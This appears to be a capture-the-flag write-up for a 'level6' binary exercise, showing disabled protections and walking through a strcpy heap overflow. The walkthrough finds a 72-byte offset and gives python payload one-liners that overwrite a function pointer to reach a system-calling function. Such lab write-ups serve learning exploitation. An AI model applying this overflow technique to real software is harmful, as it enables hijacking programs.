``` 
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
```

This time we have a binary that needs at least a first arg to launch without crashing

Ltraces shows us strcpy, which is an unsafe function, this is our entrypoint, it copies the first launch argument into a 64 wide buffer

Let's take a look in gdb with pattern generator,
we get a 72 offset, so 72 + 4 to override our return pointer

There are two uncalled functions, n performs a system call, and m performs a puts, we need to reach n but m is called by function pointer in main

There is a char buffer and a pointer to a function pointer.

Both of these are located on the heap and overloading the char buffer we should be able to change to function pointer

python -c 'print("A" * 72 + "BBBB")'

crashes on 0x42424242 so we're good on this front

Let's make it go to the function we want, at address 0x08048454

\x54\x84\x04\x08

python -c 'print("A" * 72 + "\x54\x84\x04\x08")'